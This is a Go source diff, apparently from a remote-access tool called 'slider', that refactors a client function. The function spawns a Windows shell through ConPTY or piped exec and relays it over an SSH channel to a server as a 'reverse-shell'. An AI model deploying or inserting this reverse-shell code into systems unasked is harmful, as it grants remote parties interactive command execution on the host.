@@ -5,8 +5,6 @@ package client
 import (
 	"context"
 	"encoding/json"
-	"fmt"
-	"github.com/UserExistsError/conpty"
 	"io"
 	"os/exec"
 	"slider/pkg/interpreter"
@@ -14,18 +12,14 @@ import (
 	"golang.org/x/crypto/ssh"
 )
 
-func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) error {
-	stdin, stdinErr := sshSession.StdinPipe()
-	if stdinErr != nil {
-		c.Printf("session.StdinPipe: %s", stdinErr)
+func (c *client) sendReverseShell(request *ssh.Request) {
+
+	channel, _, openErr := c.sshClientConn.OpenChannel("session", nil)
+	if openErr != nil {
+		c.Errorf("failed to open a \"session\" channel to server")
+		return
 	}
-	defer func() {
-		_ = stdin.Close()
-	}()
-	stdout, stdoutErr := sshSession.StdoutPipe()
-	if stdoutErr != nil {
-		c.Printf("session.StdoutPipe: %s", stdoutErr)
-	}
+	defer func() { _ = channel.Close() }()
 
 	cmd := exec.Command(c.interpreter.Shell, c.interpreter.ShellArgs...) //nolint:gosec
 
@@ -33,7 +27,7 @@ func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) err
 		// Request Server Terminal Size
 		_, payload, reqErr := c.sendConnRequest("window-size", true, nil)
 		if reqErr != nil {
-			return reqErr
+			c.Errorf("%s", reqErr)
 		}
 		var termSize interpreter.TermSize
 		if unMarshalErr := json.Unmarshal(payload, &termSize); unMarshalErr != nil {
@@ -42,28 +36,28 @@ func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) err
 		}
 
 		// Notify server we will be sending a PTY
-		errSSHReq := c.sendSessionRequest(sshSession, "pty-req", true, nil)
+		_, errSSHReq := channel.SendRequest("pty-req", true, nil)
 		if errSSHReq != nil {
-			return fmt.Errorf("pty-req %s", errSSHReq)
+			c.Errorf("pty-req %s", errSSHReq)
 		}
 
 		c.interpreter.Pty, _ = conpty.Start(c.interpreter.Shell, conpty.ConPtyDimensions(termSize.Cols, termSize.Rows))
 		defer func() { _ = c.interpreter.Pty.Close() }()
 
 		// Notify server we will send a Reverse Shell
-		errSSHReq = c.sendSessionRequest(sshSession, "reverse-shell", true, nil)
+		_, errSSHReq = channel.SendRequest("reverse-shell", true, nil)
 		if errSSHReq != nil {
-			return fmt.Errorf("reverse-shell %s", errSSHReq)
+			c.Errorf("pty-req %s", errSSHReq)
 		}
 
-		go func() { _, _ = io.Copy(c.interpreter.Pty, stdout) }()
-		go func() { _, _ = io.Copy(stdin, c.interpreter.Pty) }()
+		go func() { _, _ = io.Copy(c.interpreter.Pty, channel) }()
+		go func() { _, _ = io.Copy(channel, c.interpreter.Pty) }()
 
 		// Reply Server we are good to go
-		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))
+		_ = c.replyConnRequest(request, true, []byte("shell-ready"))
 
 		if code, err := c.interpreter.Pty.Wait(context.Background()); err != nil {
-			return fmt.Errorf("failed to spawn conpty with exit code %d", code)
+			c.Errorf("failed to spawn conpty with exit code %d", code)
 		}
 	} else {
 		// - You are here cause the System is likely Windows < 2018 and does not support ConPTY
@@ -71,24 +65,18 @@ func (c *client) reverseShell(sshSession *ssh.Session, initReq *ssh.Request) err
 		//   unfortunately there's no equivalent variable to set that up,
 		//   so size won't be set or updated
 
-		// Pipe requirement on Windows
-		rp, wp := io.Pipe()
-		go func() {
-			_, _ = io.Copy(wp, stdout)
-			c.Debugf("out finish")
-		}()
+		pr, pw := io.Pipe()
 
-		cmd.Stdout = stdin
-		cmd.Stdin = rp
-		cmd.Stderr = stdin
+		cmd.Stdin = channel
+		cmd.Stdout = pw
+		cmd.Stderr = pw
+		go func() { _, _ = io.Copy(channel, pr) }()
 
 		// Reply Server we are good to go
-		_ = c.replyConnRequest(initReq, true, []byte("shell-ready"))
+		_ = c.replyConnRequest(request, true, []byte("shell-ready"))
 
 		if runErr := cmd.Run(); runErr != nil {
-			return runErr
+			c.Errorf("%s", runErr)
 		}
 	}
-
-	return nil
 }
